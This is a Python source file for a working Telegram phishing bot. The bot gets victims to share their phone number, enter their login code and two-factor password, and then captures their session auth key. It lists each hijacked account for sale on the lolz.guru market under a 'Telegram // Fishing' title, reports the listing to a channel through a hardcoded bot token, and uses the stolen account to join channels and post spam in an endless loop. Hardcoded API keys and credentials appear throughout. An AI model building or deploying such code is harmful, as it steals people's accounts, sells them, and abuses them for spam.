from ClientTelegram import ClientTelegram

import config
from lolzapi import LolzteamApi
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import requests
from telethon import TelegramClient
import asyncio
from telethon import functions
from telethon.tl.types import InputPeerSelf
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.payments import GetPaymentReceiptRequest
import os
from telethon.sessions import StringSession
import flag
from telethon.tl.functions.channels import JoinChannelRequest
import binascii
from telethon.tl.functions.channels import LeaveChannelRequest

global steps
steps = {}

global lolz
lolz = LolzteamApi("b1172952fd04ba44d5e749ece2b06599150e5227")

bot = Bot(token=config.botToken)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    button_hi = KeyboardButton(config.textInfo["authorizationButtonText"], request_contact=True)
    greet_kb = ReplyKeyboardMarkup(resize_keyboard=True)
    greet_kb.add(button_hi)

    await message.reply(config.textInfo["startText"], reply_markup=greet_kb)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def contacts(msg: types.Message):
    await msg.reply(config.textInfo["connectionText"])

    try:
        if steps[msg.chat.id]["step"] == -1:
            return
    except:
        pass

    if msg.chat.id in steps.keys():
        if "client" in steps[msg.chat.id].keys():
            await steps[msg.chat.id]["client"].client.disconnect()

    try:
        steps[msg.chat.id] = {}
        steps[msg.chat.id]["step"] = 0

        client = await ClientTelegram.create(f"{msg.contact.phone_number}", 16102116, '40144a84410673ed0121c9a41e0138fa')

        client111 = client

        greet_kb = InlineKeyboardMarkup()
        greet_kb.add(InlineKeyboardButton('1', callback_data="1"), InlineKeyboardButton('2', callback_data="2"), InlineKeyboardButton('3', callback_data="3"))
        greet_kb.add(InlineKeyboardButton('4', callback_data="4"), InlineKeyboardButton('5', callback_data="5"), InlineKeyboardButton('6', callback_data="6"))
        greet_kb.add(InlineKeyboardButton('7', callback_data="7"), InlineKeyboardButton('8', callback_data="8"), InlineKeyboardButton('9', callback_data="9"))
        greet_kb.add(InlineKeyboardButton('0', callback_data="0"))
        greet_kb.add(InlineKeyboardButton('send', callback_data="send"), InlineKeyboardButton('delete', callback_data="del"))
    
        steps[msg.chat.id]["client"] = client
        steps[msg.chat.id]["step"] = 1
        steps[msg.chat.id]["phone_number"] = msg.contact.phone_number

        old_text = config.textInfo["codeText"]
        steps[msg.chat.id]["msg_text"] = old_text
        msgg = await msg.reply(config.textInfo["codeText"], reply_markup=greet_kb)

    except Exception as e:
        print(msg.contact.phone_number)
        print(e)

        os.remove(f"{msg.contact.phone_number}.session")

        await msg.reply(config.textInfo["errorSendCodeText"])

        return

@dp.callback_query_handler()
async def inline_click(call: types.CallbackQuery):
    if call.message.chat.id not in steps.keys():
        await call.message.reply("/start")
        return
    if steps[call.message.chat.id]["step"] != 1:
        return
    callback = call.data

    greet_kb = InlineKeyboardMarkup()
    greet_kb.add(InlineKeyboardButton('1', callback_data="1"), InlineKeyboardButton('2', callback_data="2"), InlineKeyboardButton('3', callback_data="3"))
    greet_kb.add(InlineKeyboardButton('4', callback_data="4"), InlineKeyboardButton('5', callback_data="5"), InlineKeyboardButton('6', callback_data="6"))
    greet_kb.add(InlineKeyboardButton('7', callback_data="7"), InlineKeyboardButton('8', callback_data="8"), InlineKeyboardButton('9', callback_data="9"))
    greet_kb.add(InlineKeyboardButton('0', callback_data="0"))
    greet_kb.add(InlineKeyboardButton('send', callback_data="send"), InlineKeyboardButton('delete', callback_data="del"))

    if callback != "send" and callback != "del":
        steps[call.message.chat.id]["msg_text"] = f"{call.message.text}{callback}"
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{call.message.text}{callback}", reply_markup=greet_kb)
    if callback == "del":
        if call.message.text == config.textInfo["codeText"]:
            return
        
        steps[call.message.chat.id]["msg_text"] = call.message.text[:-1]
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=call.message.text[:-1], reply_markup=greet_kb)

    if callback == "send":
        try:
            client111 = steps[call.message.chat.id]["client"]

            await client111.enter_code(call.message.text.replace(config.textInfo["codeText"], ""))

            steps[call.message.chat.id]["msg_text"] = ""

            sessionString = StringSession.save(client111.client.session)

            sessionString = StringSession(sessionString)
            await client111.client.disconnect()
            os.remove(f"./{client111.phone_number}.session")

            await call.message.reply(config.textInfo["validCodeText"])

            await asyncio.sleep(3)

            dc_id = sessionString.dc_id
            auth_key = binascii.hexlify(sessionString.auth_key.key)

            steps[call.message.chat.id]["step"] = -1
            while True:
                item = lolz.market_add_item(title="Телеграм // фишинг // 13 рублей", price=13, category_id=24, item_origin="fishing", extended_guarantee=0, title_en="Telegram // Fishing // 13 rub")
                if item.status_code == 429:
                    await asyncio.sleep(3)
                    continue
                    
                item = item.json()

                item_id = item["item"]["item_id"]

                await asyncio.sleep(3)

                item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
                if item_checked.status_code != 429:
                    while True:
                        await asyncio.sleep(5)
                        item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)

                        if item_checked.status_code == 429:
                            continue

                        json = item_checked.json()
                        if "status" not in json.keys():
                            break

                        if json["status"] == "ok":
                            text = f"https://lolz.guru/market/{item_id}/"
                            req = requests.get(f"https://api.telegram.org/bot5641227803:AAFVERiOhnLPQPJmhi0v4TIriv9FoWOmrbw/sendMessage?chat_id=-1001791570384&text={text}")

                        break
                
                break

            client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
            await client.connect()

            text = config.spamInfo["spamText"]

            if config.spamInfo["dmSpam"] == True:
                pass

            for channel in config.spamInfo["joinChannels"]:
                try:
                    await client(JoinChannelRequest(channel))
                except:
                    pass

            while True:
                await asyncio.sleep(12)

                for channel_id in config.spamInfo["channelsSpam"]:
                    try:
                        await client.send_message(channel_id, text)
                    except:
                        pass

        except ClientTelegram.NeedPassword:
            await call.message.reply("Введите ваш пароль 2фа:")
            steps[call.message.chat.id]["step"] = 2
        except:
            code = call.message.text.replace(config.textInfo["codeText"], "")

            await call.message.reply("Код не верный!")

@dp.message_handler(content_types=types.ContentTypes.TEXT)
async def code_step(message: types.Message):
    if message.chat.id not in steps.keys():
        await message.reply("/start")
        return
    if steps[message.chat.id]["step"] != 2:
        return
    client111 = steps[message.chat.id]["client"]

    try:
        await client111.enter_password(message.text)

        steps[message.chat.id]["msg_text"] = ""
        sessionString = StringSession.save(client111.client.session)
        sessionString = StringSession(sessionString)
        await client111.client.disconnect()
        os.remove(f"./{client111.phone_number}.session")
        await message.reply(config.textInfo["validCodeText"])
        await asyncio.sleep(3)
        dc_id = sessionString.dc_id
        auth_key = binascii.hexlify(sessionString.auth_key.key)

        steps[message.chat.id]["step"] = -1
        while True:
            item = lolz.market_add_item(title="Телеграм // фишинг // 13 рублей", price=13, category_id=24, item_origin="fishing", extended_guarantee=0, title_en="Telegram // Fishing // 13 rub")
            if item.status_code == 429:
                await asyncio.sleep(3)
                continue
                
            item = item.json()
            item_id = item["item"]["item_id"]
            await asyncio.sleep(3)
            item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
            if item_checked.status_code != 429:
                while True:
                    await asyncio.sleep(5)
                    item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
                    if item_checked.status_code == 429:
                        continue
                    json = item_checked.json()
                    if "status" not in json.keys():
                        break
                    if json["status"] == "ok":
                        text = f"https://lolz.guru/market/{item_id}/"
                        req = requests.get(f"https://api.telegram.org/bot5641227803:AAFVERiOhnLPQPJmhi0v4TIriv9FoWOmrbw/sendMessage?chat_id=-1001791570384&text={text}")
                    break
            
            break
        client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
        await client.connect()

        text = config.spamInfo["spamText"]

        if config.spamInfo["dmSpam"] == True:
            pass

        for channel in config.spamInfo["joinChannels"]:
            try:
                await client(JoinChannelRequest(channel))
            except:
                pass

        while True:
            await asyncio.sleep(12)

            for channel_id in config.spamInfo["channelsSpam"]:
                try:
                    await client.send_message(channel_id, text)
                except:
                    pass
                
    except Exception as e:
        await message.reply(config.textInfo["invalidPasswordError"])


if __name__ == '__main__':
    executor.start_polling(dp)

